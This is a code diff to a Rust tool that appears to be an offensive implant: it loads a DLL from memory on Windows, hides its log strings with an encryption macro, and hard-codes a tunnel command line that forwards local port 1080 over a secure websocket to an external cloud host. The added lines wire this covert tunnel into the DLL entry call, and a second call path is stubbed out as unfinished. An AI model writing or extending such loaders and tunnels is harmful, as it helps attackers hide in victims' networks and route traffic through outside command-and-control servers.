@@ -13,7 +13,11 @@ use crate::payload_util::set_permission;
 #[cfg(target_os = "windows")]
 use std::os::raw::c_int;
 #[cfg(target_os = "windows")]
-type DllEntryPoint = extern "C" fn();
+use std::os::raw::c_char;
+#[cfg(target_os = "windows")]
+type DllEntryPoint = extern "C" fn(*const c_char);
+//type DllEntryPoint = extern "C" fn();
+// FIRST: 
 //type DllEntryPoint = extern "C" fn() -> c_int;
 #[cfg(target_os = "windows")]
 use crate::python_embedder;
@@ -129,6 +133,9 @@ pub struct DllFromMemory {
     pub runonce: bool,
 }
 
+#[cfg(target_os = "windows")]
+use std::ffi::CString;
+
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
     pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
@@ -156,9 +163,11 @@ impl DllFromMemory {
                 let dll_entry_point = unsafe {
                     mem::transmute::<_, DllEntryPoint>(mm.get_function(&thread_dll_entrypoint))
                 };
-                info!("{}", encrypt_string!("dll_entry_point()"));
+                info!("{}", encrypt_string!("dll_entry_point(commandline)"));
 
-                let result = dll_entry_point();
+                let commandline="client -L tcp://127.0.0.1:1080:127.0.0.1:1080 --connection-min-idle 5 --no-color NO_COLOR wss://ec2-51-44-82-197.eu-west-3.compute.amazonaws.com:443";
+                let c_commandline = CString::new(commandline).expect("CString conversion failed");
+                let result = dll_entry_point(c_commandline.as_ptr());
                 drop(mm);
                 info!("drop");
                 //debug!("{}{}", encrypt_string!("DLL result = "), result);
@@ -181,8 +190,9 @@ impl DllFromMemory {
                 mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint))
             };
             info!("{}", encrypt_string!("dll_entry_point()"));
+            error!("{}", encrypt_string!("TODO not coded"));
 
-            let result = dll_entry_point();
+            //let result = dll_entry_point();
             drop(mm);
             info!("drop");
             //debug!("{}{}", encrypt_string!("DLL result = "), result);
